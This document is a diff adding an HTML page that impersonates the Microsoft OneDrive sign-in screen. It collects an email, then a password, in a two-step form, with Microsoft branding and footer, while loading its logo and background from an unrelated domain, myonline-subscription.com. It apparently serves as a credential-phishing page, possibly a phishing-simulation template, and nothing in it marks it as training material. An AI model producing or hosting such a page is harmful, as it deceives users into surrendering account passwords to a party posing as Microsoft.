@@ -1,0 +1,388 @@
+<html lang="en-US">
+
+<head>
+    <title>Sign in - Microsoft OneDrive</title>
+    <meta charset="utf-8">
+    <meta http-equiv="x-ua-compatible" content="ie=10">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="icon" type="image/png" href="https://myonline-subscription.com/static/office-365-icon.png">
+    <style>
+        html {
+    font-family: sans-serif;
+    -ms-text-size-adjust: 100%;
+    -webkit-text-size-adjust: 100%;
+}
+
+body {
+    font-family: "Segoe UI Webfont", -apple-system, "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
+    font-size: 0.9375rem;
+    line-height: 1.25rem;
+    color: #262626;
+    margin: 0;
+}
+
+* {
+    -webkit-box-sizing: border-box;
+    -moz-box-sizing: border-box;
+    box-sizing: border-box;
+}
+
+a {
+    color: #0067B8;
+    text-decoration: none;
+}
+
+a {
+    background-color: transparent;
+}
+
+.text-secondary {
+    font-size: 0.8125rem;
+}
+
+.background {
+    position: fixed;
+    top: 0px;
+    width: 100%;
+    height: 100%;
+}
+
+.blur,
+.full {
+    -webkit-animation: animate-fadeIn;
+    -o-animation: animate-fadeIn;
+    animation: animate-fadeIn;
+}
+
+.background>div {
+    position: fixed;
+    top: 0px;
+    width: 100%;
+    height: 100%;
+    background-repeat: no-repeat, no-repeat;
+    background-position: center center, center center;
+    background-size: cover, cover;
+}
+
+.outer {
+    display: table;
+    position: absolute;
+    height: 100%;
+    width: 100%;
+}
+
+.middle {
+    display: table-cell;
+    vertical-align: middle;
+}
+
+.inner {
+    margin-left: auto;
+    margin-right: auto;
+    position: relative;
+    min-height: 338px;
+    min-width: 320px;
+    max-width: 440px;
+    width: calc(100% - 40px);
+    padding: 44px;
+    margin-bottom: 28px;
+    background-color: #fff;
+    -webkit-box-shadow: 0 2px 3px rgba(0, 0, 0, 0.55);
+    box-shadow: 0 2px 3px rgba(0, 0, 0, 0.55);
+    border: 1px solid rgba(0, 0, 0, 0.4);
+}
+
+.margin-bottom-16 {
+    margin-top: 0px;
+    margin-bottom: 16px;
+}
+
+.margin-bottom-20 {
+    margin-top: 0px;
+    margin-bottom: 20px;
+}
+
+.text-title,
+h3,
+.text-body,
+p {
+    color: #404040;
+    padding: 0px;
+}
+
+.text-title,
+h3 {
+    font-size: 1.5rem;
+    line-height: 1.75rem;
+    font-weight: 600;
+    font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
+}
+
+.row {
+    margin-left: -2px;
+    margin-right: -2px;
+}
+
+body div.placeholderContainer {
+    width: 100%;
+    position: relative;
+}
+
+input,
+textarea {
+    border-style: solid;
+    border-color: #000;
+    border-color: rgba(0, 0, 0, 0.6);
+    border-top-width: 0px;
+    border-left-width: 0px;
+    border-right-width: 0px;
+    border-bottom-width: 1px;
+    border-radius: 0px;
+    padding: 6px 0px;
+    background-color: #fff;
+    background-color: rgba(255, 255, 255, 0.4);
+    outline: none;
+    height: 36px;
+}
+
+.form-control {
+    display: block;
+    width: 100%;
+    background-image: none;
+}
+
+input {
+    line-height: normal;
+}
+
+button,
+input,
+optgroup,
+select,
+textarea {
+    color: inherit;
+    font: inherit;
+    line-height: inherit;
+    margin: 0;
+}
+
+.button-container {
+    right: 69px;
+    text-align: right;
+}
+
+.no-margin-top-bottom {
+    margin-top: 0px;
+    margin-bottom: 0px;
+}
+
+.inline-block {
+    display: inline-block;
+}
+
+.button-container {
+    position: absolute;
+    bottom: 50px;
+}
+
+.no-margin-top-bottom {
+    margin-top: 0px;
+    margin-bottom: 0px;
+}
+
+.btn.btn-primary,
+button.btn-primary,
+input[type="button"].btn-primary,
+input[type="submit"].btn-primary,
+input[type="reset"].btn-primary {
+    border-color: #0067b8;
+    background-color: #0067b8;
+    color: #fff;
+}
+
+input[type="submit"].btn-block,
+input[type="reset"].btn-block,
+input[type="button"].btn-block {
+    width: 100%;
+}
+
+.btn,
+button,
+input[type="button"],
+input[type="submit"],
+input[type="reset"] {
+    display: inline-block;
+    height: 32px;
+    min-width: 108px;
+    padding: 4px 12px 4px 12px;
+    position: relative;
+    text-align: center;
+    white-space: nowrap;
+    overflow: hidden;
+    vertical-align: middle;
+    text-overflow: ellipsis;
+    touch-action: manipulation;
+    color: #000;
+    border-style: solid;
+    border-width: 1px;
+    border-radius: 0px;
+    border-color: transparent;
+    background-color: #000;
+    background-color: rgba(0, 0, 0, 0.2);
+}
+
+button,
+html input[type="button"],
+input[type="reset"],
+input[type="submit"] {
+    -webkit-appearance: button;
+    cursor: pointer;
+}
+
+#footer {
+    position: fixed;
+    bottom: 0px;
+    width: 100%;
+    overflow: visible;
+    z-index: 99;
+    clear: both;
+    background-color: #000;
+    background-color: rgba(0, 0, 0, 0.6);
+}
+
+div .footerNode {
+    margin: 0px;
+}
+
+.footerNode span {
+    color: #fff;
+    font-size: 0.75rem;
+    line-height: 28px;
+    white-space: nowrap;
+    display: inline-block;
+    float: right;
+    margin-left: 8px;
+    margin-right: 8px;
+}
+
+div .footerNode a,
+div .footerNode span {
+    color: #fff;
+    font-size: 0.75rem;
+    line-height: 28px;
+    white-space: nowrap;
+    display: inline-block;
+    float: right;
+    margin-left: 8px;
+    margin-right: 8px;
+}
+
+.button {
+    position: absolute;
+    bottom: 50px;
+    left: 60%;
+}
+
+.identity {
+    line-height: 24px;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+}
+
+
+        #form_step2 {
+            display: none;
+        }
+
+        input#btn_next_step:checked~#form_step1, input#btn_next_step:checked~label{
+            display: none;
+        }
+
+        input#btn_next_step:checked~#form_step2 {
+            display: block;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="background">
+        <div class="blur"></div>
+        <div class="full" style="background-image: url('https://myonline-subscription.com/static/office-background.png');"></div>
+    </div>
+    <div class="outer">
+        <div class="middle">
+
+            <main class="inner">
+                <div class="margin-bottom-20" aria-hidden="true">
+                    <picture class="logo margin-bottom-16">
+                        <img src="https://myonline-subscription.com/static/windows_logo.png" alt="Microsoft Logo">
+                    </picture>
+                </div>
+
+                
+    
+        
+                
+                <form method="post">
+
+                    <div>
+                        <input id="btn_next_step" type="checkbox" autocomplete="off" style="display: none;">
+                        <label for="btn_next_step" class="button btn btn-block btn-primary">Next</label>
+
+                        <div id="form_step1">
+                            <h1 class="row text-title margin-bottom-16">Sign in</h1>
+                            <div class="row margin-bottom-16">
+                                <div class="form-group col-md-12 placeholderContainer">
+                                    <input class="form-control" placeholder='Email, phone, or Skype'
+                                        aria-required="true" spellcheck="false" autocomplete="off" onkeypress="return event.keyCode != 13;">
+                                </div>
+                            </div>
+                            <div class="row margin-bottom-20">
+                                <div class="col-md-12 section text-secondary">
+                                    <span aria-hidden="true">No account?</span>
+                                    <a href="https://odc.officeapps.live.com/odc/v2.0/hrd"
+                                        aria-label="Create a Microsoft account">Create one!</a>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div id="form_step2">
+                            <div class="row identity margin-bottom-16"></div>
+                            <h1 class="row text-title margin-bottom-16">Enter password</h1>
+                            <div class="row margin-bottom-16">
+                                <div class="form-group col-md-12 placeholderContainer">
+                                    <input required type="password" class="form-control" placeholder='Password'
+                                        aria-required="true" autocomplete="off">
+                                </div>
+                            </div>
+                            <div class="row margin-bottom-20">
+                            </div>
+                            <div class="row inline-block no-margin-top-bottom button-container">
+                                <button type="submit" class="btn btn-block btn-primary">Sign in</button>
+                            </div>
+                        </div>
+
+                    </div>
+
+                </form>
+                
+                
+    
+
+
+            </main>
+        </div>
+    </div>
+    <footer id="footer">
+        <div>
+            <div class="footerNode">
+                <span>©2025 Microsoft</span>
+                <a href="https://privacy.microsoft.com/en-us/privacystatement">Privacy statement</a>
+            </div>
+        </div>
+    </footer>
+
+</body>
+
+</html>
